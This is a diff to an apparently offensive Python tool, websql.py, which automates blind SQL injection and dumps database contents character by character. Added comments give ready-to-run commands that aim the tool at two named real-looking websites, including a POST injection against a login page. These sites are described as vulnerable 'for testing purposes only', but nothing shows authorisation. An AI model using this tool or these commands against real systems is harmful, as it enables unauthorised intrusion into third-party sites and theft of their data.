@@ -4,8 +4,10 @@ import aiohttp
 import string
 import core.config as cfg
 import core.injection as injection
-
-
+#
+# pip3 install -r requirements.txt
+# python3 websql.py -u https://www.navigator-ds.ru/articles/92 -m table -> here is a vuln website for testing purposes only O_<
+# python3 websql.py -u https://rockus.su/php/login.php -m table -M POST -> one more with POST body injection
 async def extract_binary(session, data):
     chars = data['chars']
     left, right = 0, len(chars)
@@ -61,9 +63,8 @@ async def main():
 
                     for i, char  in enumerate(cfg.special_chars):
                         if results[i]:
-                            print(results)
-                            print(f"i = {i} | results = {results} | results[i] = {results[i]} | char = {char}")
-                            break
+                            data['general_name'] += char
+                            data['letter_position'] += 1
                     else:
                         attack = await extract_binary(session, data)
                         if attack:
@@ -71,7 +72,7 @@ async def main():
                             data['letter_position'] += 1
                         else:
                             sys.stdout.write("\n")
-                            print(f"\n[+] done. data dumped: {data['general_name']}")
+                            print(f"[+] done. data dumped: {data['general_name']}\n\n")
                             data['offset'] += 1
                             data['letter_position'], data['general_name'] = 1, ""
 
